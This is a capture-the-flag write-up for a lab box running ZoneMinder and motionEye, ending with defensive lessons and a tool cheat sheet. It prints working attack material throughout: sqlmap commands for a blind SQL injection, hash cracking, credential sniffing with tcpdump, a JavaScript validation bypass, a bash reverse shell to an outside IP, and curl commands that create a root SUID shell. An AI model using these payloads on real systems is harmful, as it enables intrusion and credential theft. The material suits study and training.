[🏠 Main Site](https://motasem-notes.net/) · [🛒 Store](https://shop.motasem-notes.net/) · [▶ YouTube](https://www.youtube.com/@MotasemHamdan) · [☕ Membership](https://buymeacoffee.com/notescatalog/membership)

> Practitioner-grade cybersecurity notes, cert prep guides, and courses. All premium notes available at **[buymeacoffee.com/notescatalog/extras](https://buymeacoffee.com/notescatalog/extras)** or [shop.motasem-notes.net](https://shop.motasem-notes.net)

### Recon

The full-port nmap sweep finds only two open TCP ports — SSH on 22 and HTTP on 80, both with TTL 63 (Linux, one hop). Version detection confirms OpenSSH 9.6p1 and Apache 2.4.58, which together fingerprint the OS as Ubuntu 24.04 Noble LTS. The HTTP service redirects to `cctv.htb`, so the host is added to `/etc/hosts` before a subdomain brute-force is attempted with `ffuf`, which returns no additional vhosts:

```bash
sudo nmap -p- --reason --min-rate 10000 10.129.244.156
sudo nmap -sCV -p 22,80 10.129.244.156
ffuf -u http://10.129.244.202 -H "Host: FUZZ.cctv.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
```

The only link of interest on the landing page is the "Staff Login" button which points to `http://cctv.htb/zm/`, revealing a **ZoneMinder v1.37.63** install. Crucially, ZoneMinder's default credentials of `admin / admin` are still active and grant immediate authenticated access to the dashboard — an important reminder to always test default credentials against known software before hunting for a vulnerability. The HTTP response headers reveal only Apache and give no further technology clues. Given that ZoneMinder is a well-known attack surface, a directory brute force is skipped in favor of researching the application version directly.

---

### CVE-2024-51482 — ZoneMinder Blind SQL Injection

#### Identifying the Vulnerability

Searching for `zoneminder v1.37.63 cve` quickly surfaces CVE-2024-51482, a boolean-based blind SQL injection affecting ZoneMinder v1.37.* ≤ 1.37.64, patched in 1.37.65. The vulnerability lives in the `removetag` case of `web/ajax/event.php`. The `$tagId` parameter is pulled directly from `$_REQUEST['tid']` and interpolated unsanitized into a SQL string passed to `dbNumRows`:


```php
case 'removetag' :
    $tagId = $_REQUEST['tid'];
    dbQuery('DELETE FROM Events_Tags WHERE TagId = ? AND EventId = ?', array($tagId, $_REQUEST['id']));
    $sql = "SELECT * FROM Events_Tags WHERE TagId = $tagId";
    $rowCount = dbNumRows($sql);
```

The injection point is straightforward to confirm by hitting:

```
http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1
```

which returns JSON. A time-based confirmation works immediately:

```
tid=1 AND (SELECT SLEEP(5))
```

The page takes just over 5 seconds to respond, confirming injection.

#### Building a Fast Boolean Oracle

A time-based blind injection against a bcrypt-storing database could take hours. The correct approach here is to build a faster boolean oracle using a UNION injection. The number of columns in the underlying table's result set must be determined first; 1 through 3 columns return 500 errors, while 4 columns succeeds, meaning the target query returns 4 columns. With the column count established, a `WHERE` clause boolean can be appended:

- `tid=1 UNION SELECT 1,2,3,4 WHERE 1=1` → HTTP 200 (true branch)
- `tid=1 UNION SELECT 1,2,3,4 WHERE 1=2` → HTTP 500 (false branch)

This gives a reliable, near-instant boolean oracle without any sleep-based waits — the difference between a 2-minute dump and a 60-minute dump.

#### SQLMap Exploitation

Rather than building an extraction script by hand, `sqlmap` is used. The first step is capturing a valid authenticated request (the `ZMSESSID` session cookie expires fast, so freshness matters) and saving it to a file:

```
GET /zm/index.php?view=request&request=event&action=removetag&tid=1 HTTP/1.1
Host: cctv.htb
Cookie: ZMSESSID=<fresh_session>
```

Running `sqlmap` naively against this request starts with time-based injection, which is too slow:

```bash
sqlmap -r removetag.request -p tid
```

The key is passing `sqlmap` the pre-established UNION prefix, the HTTP 200 response code to treat as true, and forcing it into boolean-only mode, and flushing the prior cached session:


```bash
sqlmap -r removetag.request -p tid --batch \
  --prefix="1 UNION SELECT 1,2,3,4 WHERE " \
  --code 200 \
  --technique=B \
  --flush-session
```

This brings identification time down from minutes to seconds. Database enumeration follows:


```bash
sqlmap -r removetag.request -p tid --batch \
  --prefix="1 UNION SELECT 1,2,3,4 WHERE " \
  --code 200 --technique=B --dbs
```

Three databases are found: `information_schema`, `performance_schema`, and `zm`. Rather than dumping everything blindly, examining ZoneMinder's open-source database schema directly at `db/zm_create.sql.in` in the ZoneMinder GitHub repo identifies the `Users` table and its columns (`Id`, `Username`, `Password`, `Name`, `Email`, etc.). Targeting only what is needed:

```bash
sqlmap -r removetag.request -p tid --batch \
  --prefix="1 UNION SELECT 1,2,3,4 WHERE " \
  --code 200 --technique=B \
  -D zm -T Users \
  --predict-output \
  -C Username,Password,Name,Email \
  --dump
```

The `--predict-output` flag tells sqlmap to try the most statistically likely next character first, giving further speed gains. The result returns three rows — `superadmin`, `mark`, and `admin` — all with bcrypt (`$2y$10$…`) password hashes.

#### Cracking Hashes

The three bcrypt hashes are saved to a file and fed to hashcat with `rockyou.txt`. Bcrypt is deliberately slow, so a strict time budget of ~5 minutes is observed rather than waiting indefinitely:


```bash
hashcat zm.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user -m 3200
```

Two hashes crack: `admin` cracks to `admin` (confirming the default credentials already used), and `mark` cracks to `opensesame`. The `superadmin` hash never cracks in a reasonable timeframe, which is fine — `mark`'s credentials are enough.

#### Initial Foothold

SSH access as `mark` is established using the recovered password:

```bash
sshpass -p opensesame ssh mark@cctv.htb
```

---

### Lateral Movement: mark → sa_mark via Plaintext Credential Sniffing

#### Host Enumeration as mark

As `mark`, initial enumeration reveals no `sudo` privileges, no access to `sa_mark`'s home directory, and a host that is a Docker container host rather than a container itself — confirmed by `ifconfig` showing `docker0`, `br-*` bridge interfaces with `172.x.x.x` addresses, and multiple `veth*` pairs, alongside the real `eth0` and `lo` interfaces. This network topology is a signal that Docker-native traffic on those bridges may be visible to the host.

The `/proc` mount hides other users' processes (`hidepid=invisible`), so `pspy`-style process monitoring isn't possible directly. However, a log file at `/opt/video/backups/server.log` (owned by UID 1005, growing every minute) leaks that `sa_mark` is authenticating to a service and issuing `status` and `disk-info` commands repeatedly, at roughly one-minute intervals. This is a strong indicator that some automated process on the network is transmitting credentials periodically and in cleartext.

Checking capabilities rather than SUID bits reveals the most important privilege for the next step:


```bash
getcap -r / 2>/dev/null
```

The output shows:

```
/usr/bin/tcpdump cap_net_raw=eip
```

`cap_net_raw` with the `eip` (effective, inheritable, permitted) flags allows any user who can execute `tcpdump` to perform raw packet captures without being root. The box author explicitly chose to set this capability, which is not a default Ubuntu configuration — it is the intended signal that traffic capture is the path forward.

#### Capturing and Analyzing Traffic

A 2-minute capture is initiated on all interfaces and written to a file:

```bash
timeout 120 tcpdump -i any -w ~/capture.pcap
```

The resulting PCAP is transferred off-box via `scp`:

```bash
sshpass -p opensesame scp mark@cctv.htb:~/capture.pcap .
```

In Wireshark, the "Statistics → Protocol Hierarchy" view shows a mix of TCP streams. The "Statistics → Conversations" view is more useful: traffic involving the attacker's IP (`10.10.x.x`) is filtered out, DNS traffic to `1.1.1.1` and `8.8.8.8` is irrelevant, traffic on port 8554 appears encrypted, and that leaves three TCP streams involving `172.25.0.10:5000` — a Docker container on the `172.25.0.0/16` bridge talking to the host on port 5000. Following those streams in plain ASCII reveals the management protocol sending commands (`status`, `disk-info`) and, critically, authenticating **in cleartext** before each command. The password for `sa_mark` is directly visible in each stream. This connects the log file observation to the network interface — the service on port 5000 is the management backend that writes `server.log`, and it never encrypts its traffic on the Docker bridge.

#### Gaining the sa_mark Shell

The recovered password works immediately via `su` without needing to leave the current SSH session:


```bash
su - sa_mark
# then
bash
```

It also works for a direct SSH session, which is more stable:

```bash
sshpass -p 'X1l9fx1ZjS7RZb' ssh sa_mark@cctv.htb
```

---

### Privilege Escalation: sa_mark → root via CVE-2025-60787

#### Service Discovery

Running `netstat` as `sa_mark` shows the full picture of localhost-bound services:

```bash
netstat -tnlp
```

Key ports visible locally:

- `127.0.0.1:8765` — motionEye web UI (identified by an HTTP response naming "motionEye")
- `127.0.0.1:7999` — Motion daemon HTTP control interface (unauthenticated, returns `Motion 4.7.1 Running [1] Camera`)
- `127.0.0.1:9081` — MJPEG stream
- `127.0.0.1:8554` — RTSP video stream
- `127.0.0.1:1935` — RTMP video stream
- `127.0.0.1:3306` — MySQL

A PDF in sa_mark's home directory, "SecureVision Staff Announcement.pdf", acts as an in-box hint that the company is migrating from an old system to ZoneMinder and that "logins for staff will remain the same" — this is a nudge toward password reuse between systems.

#### Accessing motionEye

Port 8765 is forwarded via SSH tunneling to make it accessible in a local browser:

```bash
ssh -L 8765:localhost:8765 sa_mark@cctv.htb
```

Loading `http://localhost:8765` presents the motionEye login page. None of mark's or sa_mark's credentials work with the `admin` username initially — until sa_mark's password is tried with `admin`, which succeeds. This is a password reuse pattern within the same host: the motionEye admin account shares the same password as the OS user `sa_mark`.

The installed version is **motionEye 0.43.1b4**, confirmed in the interface.

#### CVE-2025-60787 — motionEye Authenticated Command Injection

CVE-2025-60787 affects motionEye v0.43.1b4 and earlier. It is an OS command injection vulnerability where unsanitized user input in configuration parameters — specifically `image_file_name` — is written directly into Motion's configuration files and later interpreted by a shell when Motion saves an image. The code path that triggers execution is Motion's `on_picture_save` hook, which constructs a command line by substituting `%f` (the saved filename) into the command string and running the whole thing through `/bin/sh` as root.

##### Bypassing Client-Side Validation

The motionEye web UI enforces a filename character whitelist via a JavaScript regex defined in `/static/js/main.js`:

```javascript
var filenameValidRegExp = new RegExp('^([A-Za-z0-9 \(\)/._-]|%[CYmdHMSqv])+$');
```

This regex blocks shell metacharacters like `$`, `(`, and `)` from the `image_file_name` input field, and the `doApply()` submit function calls `configUiValid()` first — which iterates over all field validators and aborts the submission if any are false. The server-side request validation also uses an HMAC-style `_signature` parameter in the URL that signs the entire request body, meaning any modification of the body in Burp Repeater will fail unless the signature is recomputed.

The simplest bypass is to override the JavaScript validation directly in the browser's developer tools console before applying the payload. The most elegant method (documented in the CVE advisory itself) replaces the validation function entirely:

```javascript
configUiValid = function() { return true; };
```

An alternative is to make the regex maximally permissive:

```javascript
filenameValidRegExp = new RegExp('.*');
```

With validation disabled in the browser, the `image_file_name` field accepts a command substitution payload that the server writes directly into Motion's configuration. The page's existing JavaScript then correctly computes the `_signature` for whatever body is submitted, so the server-side signature check passes without any manual HMAC computation.

##### Confirming RCE

Set the still-image filename to a payload with a ping back:

```
$(ping -c 1 10.10.15.243).%Y-%m-%d-%H-%M-%S
```

Apply the configuration via the web UI, then take a snapshot by clicking the camera button. Catch the ICMP echo on the attacker's side:

```bash
sudo tcpdump -ni tun0 icmp
```

The ping arrives from the box, confirming code execution as root (since motionEye and the Motion daemon both run as root).

##### Reverse Shell

Update the filename payload to a bash reverse shell:

```
$(bash -c 'bash -i >& /dev/tcp/10.10.15.243/443 0>&1').%Y-%m-%d-%H-%M-%S
```

Apply the setting, trigger a snapshot, and catch the shell:

```bash
nc -lnvp 443
```

The reverse shell arrives as `root@cctv`. Upgrade to a full PTY with the standard trick:

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
# enter 'screen' when prompted for terminal type
```

---

### Beyond Root — Unintended Paths

#### Path 1: Motion's Unauthenticated Control Interface (Port 7999)

motionEye manages the Motion daemon via Motion's own built-in HTTP control interface, which runs on `127.0.0.1:7999` without any authentication. This interface is accessible as `mark` (not just `sa_mark`), making it possible to skip the credential-sniffing phase entirely and go from `mark` directly to root. The `/etc/motioneye/motion.conf` file (world-readable) reveals `webcontrol_parms 2`, meaning the advanced parameter set is exposed over the control interface — but `on_*` event hooks are blocked from being set via the control interface because `webcontrol_parms 3` ("Restricted") is required for those hooks. However, the `picture_filename` and `picture_output` parameters are available in the advanced set, and the `on_picture_save` hook is already configured in `camera-1.conf` to run shell commands that substitute `%f` (the picture path). When the filename contains `$(...)`, the shell evaluates it when building the `on_picture_save` command line before `relayevent.sh` even starts — giving arbitrary code execution as root without ever touching motionEye's UI.

Exploitation from `mark` (bypassing the entire sa_mark lateral movement step):

```bash
# Enable picture saving
curl -s "http://127.0.0.1:7999/1/config/set?picture_output=on"

# Set filename to a SUID bash payload (URL-encoded)
curl -s "http://127.0.0.1:7999/1/config/set?picture_filename=%24(cp%20/bin/bash%20/tmp/0xdf;chmod%206777%20/tmp/0xdf)"

# Make Motion treat every frame as motion, triggering continuous picture saves
curl -s "http://127.0.0.1:7999/1/config/set?emulate_motion=on"

# Wait a moment, then run the SUID bash
/tmp/0xdf -p
```

This creates a root-SUID copy of bash and immediately escalates from `mark` to root without any network sniffing or motionEye UI interaction.

#### Path 2: motionEye SHA1 Hash as a Password

A quirk in motionEye's authentication logic means the SHA1 hash of the admin password can be used _as the password itself_ to log in. The config file `/etc/motioneye/motion.conf` contains a comment-style line:

```
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
```

This is always the SHA1 hash of the real admin password (not the plaintext), written there by motionEye's config serializer. In `handlers/base.py`, `get_current_user()` reads that stored hash into `admin_password` and also computes `admin_hash = sha1(admin_password)`. It then checks whether the incoming request's `_signature` was signed with either `admin_password` (the hash) or `admin_hash` (the hash-of-hash). On the client side in `main.js`, the login form hashes whatever the user types and uses that hash as the signing key. This means that typing the SHA1 hash from the config file into the motionEye login password field causes the client to compute `sha1(sha1(realPassword))`, which the server validates against its own `admin_hash = sha1(storedHash)` — and they match. The SHA1 hash found in the config file can therefore be used directly as the login password from a browser, without ever recovering the plaintext `X1l9fx1ZjS7RZb` from the network.

---

### Key Lessons for the Analyst

**Default credentials are still endemic in real deployments.** ZoneMinder shipped with `admin/admin` left in place on a production-facing surveillance system — always verify defaults before hunting for CVEs, since the simplest attack path frequently wins.

**Guide `sqlmap` with oracle intelligence you already possess.** The difference between time-based blind and boolean-union blind injection is the difference between an hour-long dump and a two-minute dump. When you can manually identify that a UNION injection changes an HTTP response code (200 vs 500), feed that context to `sqlmap` via `--prefix`, `--code`, and `--technique=B` flags. Never accept the tool's default detection strategy when you have better information.

**Linux capabilities are as privilege-escalating as SUID.** `cap_net_raw=eip` on `tcpdump` is not a default Ubuntu setting — when you see it, the box author is pointing at it. Always check capabilities alongside SUID/GUID during post-exploitation enumeration: `getcap -r / 2>/dev/null`. Any non-privileged user on a host where `tcpdump` carries `cap_net_raw` can capture raw packets on any interface, including Docker bridges where inter-container traffic may flow in plaintext.

**Traffic analysis starts with Conversations, not Protocol Hierarchy.** Wireshark's Statistics → Protocol Hierarchy tells you what protocols exist; Statistics → Conversations tells you _who is talking to whom_ and in what volume, making it fast to rule out your own traffic and zero in on unexpected host-to-container sessions. TCP stream follow-up in ASCII is the final step to recover cleartext credentials from those streams.

**Client-side validation is a courtesy, not a security control.** CVE-2025-60787's exploitation is blocked entirely by a JavaScript regex and a JavaScript function call — two lines that can be patched in any browser's developer console in seconds. Any security-sensitive validation that only exists in the frontend is not meaningful protection from an authenticated attacker, and the server must enforce input constraints independently.

**Reading open-source application code accelerates enumeration significantly.** ZoneMinder and motionEye are both fully public on GitHub. Knowing the ZoneMinder schema from `db/zm_create.sql.in` meant targeting only the four necessary columns rather than dumping the entire database. Reading motionEye's `base.py` and `main.js` explained the exact signature mechanism and revealed the hash-as-password quirk without any dynamic discovery.

**Port 7999 (Motion webcontrol) is an unauthenticated root-command-interface when misconfigured.** `webcontrol_parms 2` (Advanced) allows setting `picture_filename` without authentication, and the `on_picture_save` hook that interprets that filename as a shell command runs as root. Any host-local user who can reach port 7999 can achieve root code execution via command substitution in the filename parameter, regardless of whether motionEye's authenticated UI is involved.

---

### Tools & Cheat Sheet

|Tool|Purpose in this box|Key command / flag|
|---|---|---|
|`nmap`|Full-port scan + service/version detection; OS fingerprint from banner versions|`nmap -p- --reason --min-rate 10000 <ip>` then `nmap -sCV -p 22,80 <ip>`|
|`ffuf`|Subdomain brute force via `Host` header fuzzing; auto-calibration to filter baseline responses|`ffuf -u http://<ip> -H "Host: FUZZ.cctv.htb" -w <wordlist> -ac`|
|`sqlmap`|Automated blind SQLi exploitation; critical to pass `--prefix`, `--code`, `--technique=B` for boolean mode|`sqlmap -r req.txt -p tid --batch --prefix="1 UNION SELECT 1,2,3,4 WHERE " --code 200 --technique=B --dbs`|
|`hashcat`|Offline bcrypt hash cracking (`-m 3200`) against rockyou; `--user` parses `user:hash` file format|`hashcat zm.hashes rockyou.txt --user -m 3200`|
|`sshpass`|Non-interactive SSH/SCP using a password (avoids interactive prompts in scripts)|`sshpass -p <pass> ssh <user>@<host>` / `sshpass -p <pass> scp <user>@<host>:<remote> <local>`|
|`tcpdump`|Raw packet capture using `cap_net_raw` capability (no root needed); capture to PCAP for offline analysis|`timeout 120 tcpdump -i any -w ~/capture.pcap`|
|Wireshark|PCAP analysis; Protocol Hierarchy + Conversations views to triage traffic; Follow TCP Stream for plaintext recovery|Statistics → Conversations → TCP; Right-click stream → Follow → TCP Stream|
|`ifconfig`|Network interface enumeration to detect Docker bridges and container network topology|`ifconfig`|
|`getcap`|Linux capability enumeration; critical for finding `cap_net_raw` on `tcpdump`|`getcap -r / 2>/dev/null`|
|`netstat`|Enumerate locally-bound services not visible externally; discover motionEye on 8765, Motion on 7999|`netstat -tnlp`|
|`curl`|Interact with Motion's unauthenticated HTTP control interface on port 7999|`curl -s "http://127.0.0.1:7999/1/config/set?picture_output=on"`|
|SSH port-forward (`-L`)|Tunnel localhost-bound service (motionEye port 8765) to the attacker's browser|`ssh -L 8765:localhost:8765 sa_mark@cctv.htb`|
|Browser DevTools console|Override client-side JavaScript validation to allow injection payloads in motionEye UI|`configUiValid = function() { return true; }` or `filenameValidRegExp = new RegExp('.*')`|
|`nc`|Catch reverse shell from motionEye command injection|`nc -lnvp 443`|
|`script` / `stty` PTY trick|Upgrade dumb reverse shell to full interactive PTY|`script /dev/null -c bash` → Ctrl+Z → `stty raw -echo; fg` → `screen` at terminal prompt|
|`su`|Lateral movement from `mark` to `sa_mark` using sniffed cleartext credential|`su - sa_mark`|
|`find`|SUID/SGID binary enumeration; spot dynamic log files growing under other UIDs|`find / -type f -perm -4000 2>/dev/null` / `find /opt -type f -ls`|